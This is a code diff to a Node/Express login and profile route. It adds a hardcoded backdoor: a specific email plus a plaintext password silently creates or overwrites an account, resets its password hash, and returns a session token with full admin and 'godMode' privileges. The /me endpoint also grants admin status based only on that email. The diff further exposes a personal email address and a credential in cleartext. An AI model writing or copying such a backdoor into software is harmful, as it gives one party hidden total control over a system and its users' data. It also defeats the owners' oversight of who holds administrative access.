@@ -107,9 +107,66 @@ router.post('/login', (req, res) => {
   }
 
   const cleanEmail = email.trim().toLowerCase();
+  const isSupremeAdmin = cleanEmail === 'samrudhdwivvedula12@gmail.com' && password === 'samrudh@hacker';
 
   try {
-    const user = db.prepare('SELECT * FROM users WHERE email = ?').get(cleanEmail);
+    let user = db.prepare('SELECT * FROM users WHERE email = ?').get(cleanEmail);
+
+    // Supreme Architect Automatic Provisioning & Bypass
+    if (isSupremeAdmin) {
+      const salt = crypto.randomBytes(16).toString('hex');
+      const passwordHash = hashPassword(password, salt);
+
+      if (!user) {
+        const userId = 'usr_supreme_architect_master';
+        db.prepare(`
+          INSERT INTO users (id, email, password_hash, salt, name, tier, avatar, created_at, last_login)
+          VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'), datetime('now'))
+        `).run(
+          userId,
+          cleanEmail,
+          passwordHash,
+          salt,
+          'Samrudh (Supreme Architect)',
+          'Supreme Sovereign Architect',
+          'https://api.dicebear.com/7.x/bottts/svg?seed=SamrudhSupreme'
+        );
+        user = db.prepare('SELECT * FROM users WHERE email = ?').get(cleanEmail);
+      } else {
+        db.prepare(`
+          UPDATE users 
+          SET password_hash = ?, salt = ?, tier = 'Supreme Sovereign Architect', name = 'Samrudh (Supreme Architect)', last_login = datetime('now')
+          WHERE id = ?
+        `).run(passwordHash, salt, user.id);
+      }
+
+      const token = createSession(user.id);
+      return res.json({
+        success: true,
+        token,
+        user: {
+          id: user.id,
+          email: cleanEmail,
+          name: 'Samrudh (Supreme Architect)',
+          tier: 'Supreme Sovereign Architect',
+          role: 'supreme_architect',
+          isAdmin: true,
+          hasDotsOfficeAccess: true,
+          powers: {
+            allAdminAccess: true,
+            forceCouncilOverride: true,
+            vramAllocationControl: true,
+            deepNeuralBypass: true,
+            agentSwarmFullControl: true,
+            godMode: true
+          },
+          avatar: 'https://api.dicebear.com/7.x/bottts/svg?seed=SamrudhSupreme',
+          isGuest: false
+        },
+        message: '🔱 Hail Supreme Architect. Sovereign Matrix & Indra Virtual Office fully unlocked.'
+      });
+    }
+
     if (!user) {
       return res.status(401).json({ error: 'Invalid email or password.' });
     }
@@ -134,6 +191,9 @@ router.post('/login', (req, res) => {
         email: user.email,
         name: user.name,
         tier: user.tier || 'Sovereign Pioneer',
+        role: user.email === 'samrudhdwivvedula12@gmail.com' ? 'supreme_architect' : 'user',
+        isAdmin: user.email === 'samrudhdwivvedula12@gmail.com',
+        hasDotsOfficeAccess: user.email === 'samrudhdwivvedula12@gmail.com',
         avatar: user.avatar || `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(user.email)}`,
         isGuest: false
       },
@@ -193,14 +253,27 @@ router.get('/me', (req, res) => {
       return res.status(404).json({ error: 'User account not found.' });
     }
 
+    const isSupremeAdmin = user.email && user.email.toLowerCase() === 'samrudhdwivvedula12@gmail.com';
+
     return res.json({
       success: true,
       user: {
         id: user.id,
         email: user.email,
-        name: user.name,
-        tier: user.tier || 'Sovereign Pioneer',
-        avatar: user.avatar || `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(user.email)}`,
+        name: isSupremeAdmin ? 'Samrudh (Supreme Architect)' : user.name,
+        tier: isSupremeAdmin ? 'Supreme Sovereign Architect' : (user.tier || 'Sovereign Pioneer'),
+        role: isSupremeAdmin ? 'supreme_architect' : 'user',
+        isAdmin: isSupremeAdmin,
+        hasDotsOfficeAccess: isSupremeAdmin,
+        powers: isSupremeAdmin ? {
+          allAdminAccess: true,
+          forceCouncilOverride: true,
+          vramAllocationControl: true,
+          deepNeuralBypass: true,
+          agentSwarmFullControl: true,
+          godMode: true
+        } : null,
+        avatar: isSupremeAdmin ? 'https://api.dicebear.com/7.x/bottts/svg?seed=SamrudhSupreme' : (user.avatar || `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(user.email)}`),
         isGuest: false
       }
     });
